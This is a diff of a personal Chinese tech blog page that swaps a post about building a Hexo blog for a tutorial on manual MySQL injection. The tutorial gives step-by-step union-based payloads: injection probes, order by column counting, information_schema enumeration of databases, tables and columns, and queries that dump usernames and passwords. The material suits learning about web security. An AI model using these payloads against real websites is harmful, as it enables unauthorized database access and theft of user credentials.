@@ -123,7 +123,7 @@
 
 
 
-  <title>博客搭建 | 简单的世界</title>
+  <title>mysql注入 | 简单的世界</title>
   
 
 
@@ -252,7 +252,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://liyusen.xyz/2019/05/30/博客搭建/">
+    <link itemprop="mainEntityOfPage" href="http://liyusen.xyz/2019/06/01/mysql注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="羽洛l">
@@ -269,7 +269,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">博客搭建</h1>
+          <h1 class="post-title" itemprop="name headline">mysql注入</h1>
         
 
         <div class="post-meta">
@@ -281,7 +281,7 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-30T16:31:21+08:00">2019-05-30</time>
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-01T16:43:22+08:00">2019-06-01</time>
             
 
             
@@ -317,61 +317,85 @@
       
 
       
-        <h2 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a><strong>博客搭建</strong></h2><p>​由于许久没有使用博客了，导致博客不可用，于是就把它卸载重新搭建，也是相当于巩固一下吧！</p>
-<p>话不多说开始吧</p>
-<p>​    搭建博客需要安装以下的东西：</p>
-<p>1、下载Git</p>
-<p>2、下载node.js</p>
-<p>3、安装hexo</p>
-<h5 id="下载Git"><a href="#下载Git" class="headerlink" title="下载Git"></a>下载Git</h5><p>方式一(官网下载)：<a href="https://git-scm.com/download/win" target="_blank" rel="noopener">https://git-scm.com/download/win</a>(到此页面后，会有一个下载弹框出现)</p>
-<p>方式二(csdn下载)：<a href="http://download.csdn.net/download/ainuser/9952103" target="_blank" rel="noopener">http://download.csdn.net/download/ainuser/9952103</a></p>
-<p>​    安装git一路向下next就可以了 </p>
-<h5 id="下载node-js"><a href="#下载node-js" class="headerlink" title="下载node.js"></a>下载node.js</h5><p>下载方式一：<a href="http://nodejs.org/download/" target="_blank" rel="noopener">http://nodejs.org/download/</a></p>
-<p>下载方式二：<a href="https://nodejs.org/en/" target="_blank" rel="noopener">https://nodejs.org/en/</a></p>
-<p>下载方式三：<a href="http://download.csdn.net/download/ainuser/9952074" target="_blank" rel="noopener">http://download.csdn.net/download/ainuser/9952074</a></p>
-<p>安装步骤基本一样</p>
-<h5 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h5><p>首先在磁盘中建立一个hexo的文件夹用于储存文件。</p>
-<p>然后在hexo文件夹中右键点击打开git bash here 命令框，</p>
-<p>在命令行中依次输入:</p>
-<p>​<br>    npm install -g hexo</p>
-<p>​    hexo init</p>
-<p>​    npm install</p>
-<p>检测是否完整安装hexo,在命令行中输入：</p>
-<p>​    hexo server </p>
-<p>注意，当出现 <a href="http://localhost:4000的时候，可以在浏览器中输入，如果出现本地访问页面的话就说明成功了，如果出现404的话那就错误则可以尝试下面的命令" target="_blank" rel="noopener">http://localhost:4000的时候，可以在浏览器中输入，如果出现本地访问页面的话就说明成功了，如果出现404的话那就错误则可以尝试下面的命令</a></p>
-<p>​    npm install hexo-deployer-git –save或者</p>
-<p>​    npminstall hexo-server –save</p>
-<p>如果出现本地页面的的话就忽略吧</p>
-<p>按Ctrl+c退出继续以下的命令</p>
-<p>​    hexo clean</p>
-<p>​    hexo generate</p>
-<p>​    hexo deploy</p>
-<p>然后是域名的购买、解析等，就不举例了</p>
-<p>当域名有了后在hexo文件夹中的source中建立一个以CNAME命名的文件(切记把后缀去掉）</p>
-<p>内容为你购买的域名如：<a href="http://www.xxxxxx.xyz" target="_blank" rel="noopener">www.xxxxxx.xyz</a> 然后保存关闭</p>
-<h4 id="注册账号"><a href="#注册账号" class="headerlink" title="注册账号"></a>注册账号</h4><p>首先注册一个GitHub账户:</p>
-<p>github的地址为：<a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a></p>
-<p>进行一系列的操作，也就是注册GitHub账户，注册好之后可以在setting(设置)里面操作。</p>
-<p>SSH key配置</p>
-<p>在hexo文件夹中右键点击打开git bash here 命令框</p>
-<p>可以输入下列的命令，看看是否有SSH key:<br>cd ~/.ssh</p>
-<p>如果提示 No such file or directory 说明你是第一次使用git</p>
-<p>那就要生成新的SSH key:<br>ssh-keygen -t rsa -C “github注册时用的邮箱@qq.com”</p>
-<p>然后提示输入密码，这个密码要记住，因为在你以后检查使用。</p>
-<p>之后就要添加SSH key到GitHub上</p>
-<p>在本机设置SSH Key之后，需要添加到GitHub上，以完成SSH链接的设置。</p>
-<p>1、打开本地C:\Documents and Settings\Administrator.ssh\id_rsa.pub文件。此文件里面内容为刚才生成人密钥。如果看不到这个文件，你需要设置显示隐藏文件。准确的复制这个文件的内容，才能保证设置的成功。</p>
-<p>2、登陆github系统。点击右上角的 Account Settings—&gt;SSH Public keys —&gt; add another public keys<br>3、把你本地生成的密钥复制到里面（key文本框中）， 点击 add key 就ok了</p>
-<p>完成后，输入下列命令看看设置是否成功：<br>ssh -T git@github</p>
-<p>命令输入后它会提示你输入密码，输入刚的密码就可以了。</p>
-<p>完成后继续输入以下命令:</p>
-<p>git config –global user.name “你的GitHub名字”</p>
-<p>git config –global user.email  “你自己的邮箱”</p>
-<h4 id="域名绑定"><a href="#域名绑定" class="headerlink" title="域名绑定"></a>域名绑定</h4><p>接下来就是域名绑定了:</p>
-<p>进入GitHub，点击右上角的加号，点击New repository按钮创建仓库， Respository name 中的username.github.io 的username 一定与前面的Owner 一致，记住你的username下面会用到，然后点击Create repository</p>
-<p>创建好后点击settings(设置)下拉到GitHub Pagess，点击Choose a theme,选择一个主题，完成后再次回到这里，可以看到出现了一个新的选项Custom domain，在他的框框里输入你已经解析的域名，勾选https,点击save就可以了</p>
-<p>域名绑定完成。</p>
-<p>现在可以在浏览器输入你的域名看看什么效果吧</p>
+        <pre><code>在讲MySQL注入的之前，我们先来了解一下什么是sql。
+</code></pre><h4 id="1、什么是sql"><a href="#1、什么是sql" class="headerlink" title="1、什么是sql"></a>1、什么是sql</h4><pre><code>SQL是一个通用的、功能强大的关系数据库语言，但其功能并不仅仅是
+查询,它可以用来访问和操作数据库系统。SQL 语句用于取回和更新数
+据库中的数据，同时，它也是一门标准的计算机语言。
+</code></pre><h4 id="2、什么是SQL注入"><a href="#2、什么是SQL注入" class="headerlink" title="2、什么是SQL注入"></a>2、什么是SQL注入</h4><pre><code>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询
+字符串，最终达到欺骗服务器执行恶意的SQL命令。简单来说，SQL注入就是一种通过
+操作输入（可以是表单，可以是get请求，也可以是POST请求等）来插入或修改后台
+SQL语句达到代码执行从而进行攻击的技术。
+</code></pre><h4 id="3、SQL注入产生的原因"><a href="#3、SQL注入产生的原因" class="headerlink" title="3、SQL注入产生的原因"></a>3、SQL注入产生的原因</h4><pre><code>其主要原因就是当网页程序员在编写代码的时候，没有对用户输入数据的合法性进行
+严格的判断和过滤，从而导致应用程序存在该漏洞
+</code></pre><h4 id="4、攻击方法"><a href="#4、攻击方法" class="headerlink" title="4、攻击方法"></a>4、攻击方法</h4><pre><code>对于MySQL的注入主要有以下两种方法：
+
+（1）手工注入
+（2）使用工具注入
+</code></pre><p>好了在基本介绍了MySQL之后，我们来进行实验。</p>
+<p>首先，我们要确定该网站是否存在SQL注入,同时也要确定注入是字符型还是数字型</p>
+<pre><code>1、常见的有如下：
+
+    ？id=1    显示正常页面
+    ？id=1&apos;    显示错误页面
+
+2、也可以是:
+
+    ? id=1 and 1=1    页面显示正常，因为1=1是正确的
+    ？id=1 and 1=2    页面显示错误，因为1=2本来就是错误的，所以页面也就返回错误
+
+数字型：and 1=1 and 1=2 判断是否存在注入
+字符型：&apos; and &apos;1&apos;=&apos;1 &apos; and &apos;1&apos;=&apos;2
+搜索型： 关键字%&apos; and 1=1 and &apos;%&apos;=&apos;% 关键字%&apos; and 1=2 and &apos;%&apos;=&apos;%
+</code></pre><p>当我们基本上确定了网站存在注入的时候那么就可以进行下一步的操作了</p>
+<h4 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h4><p>当我们确定了一个网站存在了基本的注入时，可以通过语句来获取字段</p>
+<pre><code>and 1=1 order by n    通过不断改变n的值以及观察页面的情况来确定字段数
+
+比如说n在5的时候出错了，那就说明select的字段是4个
+</code></pre><p>####判断显示位</p>
+<p>当我们得到n的值时，就可以用 union select来判断他的显示位</p>
+<pre><code>and 1=2 union select 1,2,3,4,5,....,n #
+
+注释常常使用    --+、#、%23
+</code></pre><p>一般数字会显示在页面的任何位置，如何判断它呢，和正常页面作比较，如果正常页面没有而他又有说明他就是你要找的数字。</p>
+<p>####查当前数据库</p>
+<pre><code>and 1=2 union select 1,2,3,SCHEMA_NAME from information_schema.schemata
+
+and 1=2 union select 1,2,database()
+
+当然databaes()也可以换其他的，如version()数据库的版本信息
+而databaes()则是用户信息
+
+获取数据库名
+union select 1,2,SCHEMA_NAME, from information_schema.SCHEMATA limit 0,1   #得到第一个库名
+
+union select 1,2,SCHEMA_NAME, from information_schema.SCHEMATA limit 1,1   #得到第二个库名
+</code></pre><p>####查表名<br>当我们确定了数据库时就要获取数据库的表名，所以下一步就要获取它的表名</p>
+<pre><code>and 1=2 union selec 1,2,3,table_name，5 from information_schema.tables where table_schema=batabaes()/*这里就是上面的数据库*/ limit 0,1
+
+或者  union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
+
+查找所有表的语句：select table_name from information_schema.tables where table_schema=&apos;当前数据库&apos;
+</code></pre><p>####查列名<br>    我们用information_schema.columns可以获取表中的所有字段</p>
+<pre><code>and 1=2 union select 1,2,3,column_name,5,6,7 from information_schema.columns where table_name=&apos;表名或者表名的十六进制&apos; limit 0,1
+
+但是有的时候后台的代码可能仅用了使用where子句，那么这个时候就无法通过information_schema.coumns来得到列名了，这个时候只能够根据你自己多年的
+黑客经验来进行猜解了。猜解的方法也是比较的简单，使用exists子句就可以进行猜解了。假设在我们已经知道了表名的情况下(当然猜解表名也使用通过exists子句来完成)
+
+语句：id=1 and exists(select 猜测的列名 from users)
+如果在users表中不存在就会报错或者不显示内容
+如果存在机会返回结果，那就说明users表中存在列名
+</code></pre><p>####查字段内容</p>
+<pre><code>当我们得到表名和字段名后就可以dump数据库的所有信息了，比如，查询用户名，查询密码等等，当然我们还可以脱库，下载表中所有信息
+
+and 1=2 union select 1,2,password from 表名    /*查询密码*/
+
+and 1=2 union select 1,2,username from 表名    /*用户名*/
+</code></pre><p>####脱库</p>
+<pre><code>比如下载users的所有数据
+
+and 1=2 union select 1,2,group_concat(username,password),4 from users(表名)
+</code></pre><p>当然也可以得到其他的数据，不止用户名和密码。</p>
+<p>以上就是一个sql注入的基本过程了，但是想要精通的活还需要不断的努力啊。</p>
 
       
     </div>
@@ -396,8 +420,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/05/30/kali换源显示没有公钥问题/" rel="next" title="kali换源显示没有公钥问题">
-                <i class="fa fa-chevron-left"></i> kali换源显示没有公钥问题
+              <a href="/2019/06/01/hello-world/" rel="next" title="Hello World">
+                <i class="fa fa-chevron-left"></i> Hello World
               </a>
             
           </div>
@@ -405,10 +429,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/06/01/hello-world/" rel="prev" title="Hello World">
-                Hello World <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -524,7 +544,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#博客搭建"><span class="nav-number">1.</span> <span class="nav-text">博客搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#下载Git"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">下载Git</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#下载node-js"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">下载node.js</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#安装hexo"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">安装hexo</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注册账号"><span class="nav-number">1.0.1.</span> <span class="nav-text">注册账号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#域名绑定"><span class="nav-number">1.0.2.</span> <span class="nav-text">域名绑定</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、什么是sql"><span class="nav-number">1.</span> <span class="nav-text">1、什么是sql</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2、什么是SQL注入"><span class="nav-number">2.</span> <span class="nav-text">2、什么是SQL注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3、SQL注入产生的原因"><span class="nav-number">3.</span> <span class="nav-text">3、SQL注入产生的原因</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4、攻击方法"><span class="nav-number">4.</span> <span class="nav-text">4、攻击方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取字段"><span class="nav-number">5.</span> <span class="nav-text">获取字段</span></a></li></ol></div>
             
 
           </div>
